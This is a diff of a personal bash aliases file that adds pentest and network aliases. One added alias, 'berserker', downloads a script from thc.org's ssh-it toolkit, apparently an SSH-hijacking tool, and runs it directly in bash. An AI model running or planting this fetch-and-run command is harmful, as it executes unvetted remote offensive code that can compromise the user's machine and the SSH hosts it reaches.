@@ -75,14 +75,21 @@ function la {
 # === CORE CLI OVERRIDES ===
 alias sudo='sudo -E bash -c "source ~/.bash_aliases; \"\$@\"" --'
 alias tree="eza --tree --icons=always --level=3 --long --group --no-time --git"
-alias htop="btop"
 
 
 # === SEC TOOLS & PENTEST ALIASES ===
 alias burpsuite="java -Dburp.ignore_java_version=true -jar /usr/share/java/burpsuite/burpsuite.jar"
+alias berserker='export BS="$(curl -fsSL https://thc.org/ssh-it/bs)" && bash -c "$BS"'
+
+
+
+# === NETWORK ===
+alias nd="netdoc"
+alias ledger-live='ledger-live-desktop --proxy-server="http://127.0.0.1:8888" --proxy-bypass-list="<-loopback>"'
 
 
 # === DNS Tunneling ===
+
 # Switch to DNS over SSH
 alias doson='
     if [ -f /etc/systemd/resolved.conf.d/ssh-tunnel.conf.bak ]; then
